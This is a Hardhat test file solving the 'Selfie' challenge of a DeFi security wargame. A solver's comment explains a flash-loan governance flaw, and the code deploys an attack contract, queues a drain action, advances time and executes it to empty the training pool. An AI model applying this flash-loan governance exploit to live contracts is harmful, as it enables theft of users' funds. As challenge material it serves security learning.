const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Selfie', function () {
    let deployer, attacker;

    const TOKEN_INITIAL_SUPPLY = ethers.utils.parseEther('2000000'); // 2 million tokens
    const TOKENS_IN_POOL = ethers.utils.parseEther('1500000'); // 1.5 million tokens
    
    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const DamnValuableTokenSnapshotFactory = await ethers.getContractFactory('DamnValuableTokenSnapshot', deployer);
        const SimpleGovernanceFactory = await ethers.getContractFactory('SimpleGovernance', deployer);
        const SelfiePoolFactory = await ethers.getContractFactory('SelfiePool', deployer);

        this.token = await DamnValuableTokenSnapshotFactory.deploy(TOKEN_INITIAL_SUPPLY);
        this.governance = await SimpleGovernanceFactory.deploy(this.token.address);
        this.pool = await SelfiePoolFactory.deploy(
            this.token.address,
            this.governance.address    
        );

        await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.be.equal(TOKENS_IN_POOL);
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */
        /** WHAT'S WRONG?
         * @notice the one wrong in this contract is the contract itself
         * the governance contract need an address to have half of the total supply to queue an action
         * simply that address can loan from SelfiePool then queue an action
         * yes that capable to queue drainAllFund from SelfiePool! 
         * so attacker should loan from SelfiePool and queue drainAllFund, after 2 days attacker can execute the action!
         */
        const AttackFactory = await ethers.getContractFactory("SelfieAttack",attacker);
        this.attackContract = await AttackFactory.deploy(this.governance.address, this.pool.address,this.token.address);
        await this.attackContract.connect(attacker).attack(attacker.address);
        await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60])
        await this.governance.connect(attacker).executeAction(await this.attackContract.actionId());
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.be.equal(TOKENS_IN_POOL);        
        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.be.equal('0');
    });
});
